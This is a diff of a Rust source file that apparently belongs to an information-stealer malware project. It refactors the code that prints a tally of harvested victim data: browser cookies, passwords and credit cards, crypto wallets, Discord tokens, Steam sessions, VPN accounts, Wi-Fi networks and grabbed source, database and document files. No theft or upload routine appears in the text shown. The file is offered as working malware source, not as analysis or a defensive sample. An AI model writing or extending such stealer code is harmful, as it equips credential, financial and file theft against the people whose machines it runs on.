@@ -2,11 +2,10 @@
 
 extern crate alloc;
 
+use alloc::format;
 use alloc::vec::Vec;
-use core::fmt::{Display, Formatter};
-use indoc::indoc;
-
 pub mod atomic;
+pub mod display;
 
 macro_rules! increase_count {
     ($name:ident) => {
@@ -89,99 +88,4 @@ pub trait Collector: Send + Sync {
     fn get_vpn(&self) -> &Self::Vpn;
 
     fn get_device(&self) -> &Self::Device;
-}
-
-pub struct EmojiBoolean(pub bool);
-
-impl Display for EmojiBoolean {
-    fn fmt(&self, f: &mut Formatter<'_>) -> core::fmt::Result {
-        if self.0 {
-            write!(f, "✅")
-        } else {
-            write!(f, "❌")
-        }
-    }
-}
-
-pub struct DisplayCollector<'a, T: Collector>(pub &'a T);
-
-impl<T: Collector> Display for DisplayCollector<'_, T> {
-    fn fmt(&self, f: &mut Formatter<'_>) -> core::fmt::Result {
-        write!(
-            f,
-            indoc! {"
-                ▶ Browser:
-                  ├─ Cookies: {}
-                  ├─ Passwords: {}
-                  ├─ Credit cards: {}
-                  ├─ Auto fills: {}
-                  ├─ History: {}
-                  ├─ Bookmarks: {}
-                  └─ Downloads: {}
-            "},
-            self.0.get_browser().get_cookies(),
-            self.0.get_browser().get_passwords(),
-            self.0.get_browser().get_credit_cards(),
-            self.0.get_browser().get_auto_fills(),
-            self.0.get_browser().get_history(),
-            self.0.get_browser().get_bookmarks(),
-            self.0.get_browser().get_downloads(),
-        )?;
-
-        writeln!(f)?;
-
-        write!(
-            f,
-            indoc! {"
-                ▶ Software:
-                  ├─ Wallets: {}
-                  ├─ Ftp hosts: {}
-                  ├─ Telegram: {}
-                  ├─ Discord tokens: {}
-                  └─ Steam sessions: {}
-            "},
-            self.0.get_software().get_wallets(),
-            self.0.get_software().get_ftp_hosts(),
-            self.0.get_software().is_telegram(),
-            self.0.get_software().get_discord_tokens(),
-            self.0.get_software().get_steam_session(),
-        )?;
-
-        writeln!(f)?;
-
-        write!(
-            f,
-            indoc! {"
-                ▶ Files:
-                  ├─ Source code: {}
-                  ├─ Database: {}
-                  └─ Documents: {}
-            "},
-            self.0.get_file_grabber().get_source_code_files(),
-            self.0.get_file_grabber().get_database_files(),
-            self.0.get_file_grabber().get_documents(),
-        )?;
-
-        writeln!(f)?;
-
-        write!(
-            f,
-            indoc! {"
-                ▶ Vpn:
-                  └─ Accounts: {}
-            "},
-            self.0.get_vpn().get_accounts(),
-        )?;
-
-        writeln!(f)?;
-
-        write!(
-            f,
-            indoc! {"
-                ▶ Device:
-                  └─ Wifi networks: {}
-            "},
-            self.0.get_device().get_wifi_networks(),
-        )
-    }
 }
